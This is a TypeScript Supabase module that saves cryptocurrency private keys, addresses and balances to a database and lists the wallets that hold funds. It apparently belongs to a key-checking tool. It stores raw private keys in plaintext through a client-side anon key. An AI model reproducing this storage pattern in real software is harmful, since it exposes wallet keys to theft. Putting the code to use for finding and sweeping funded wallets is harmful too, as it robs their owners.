import { createClient } from '@supabase/supabase-js';

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;

if (!supabaseUrl || !supabaseAnonKey) {
  throw new Error('Missing Supabase environment variables');
}

export const supabase = createClient(supabaseUrl, supabaseAnonKey);

export interface WalletRecord {
  id: string;
  private_key: string;
  address: string;
  balance: number;
  checked_at: string;
  created_at: string;
}

export async function saveWallet(
  privateKey: string,
  address: string,
  balance: number
): Promise<WalletRecord | null> {
  const { data, error } = await supabase
    .from('wallets')
    .insert({
      private_key: privateKey,
      address,
      balance,
      checked_at: new Date().toISOString(),
    })
    .select()
    .maybeSingle();

  if (error) {
    console.error('Error saving wallet:', error);
    return null;
  }

  return data;
}

export async function getWalletsWithBalance(): Promise<WalletRecord[]> {
  const { data, error } = await supabase
    .from('wallets')
    .select('*')
    .gt('balance', 0)
    .order('balance', { ascending: false });

  if (error) {
    console.error('Error fetching wallets:', error);
    return [];
  }

  return data || [];
}
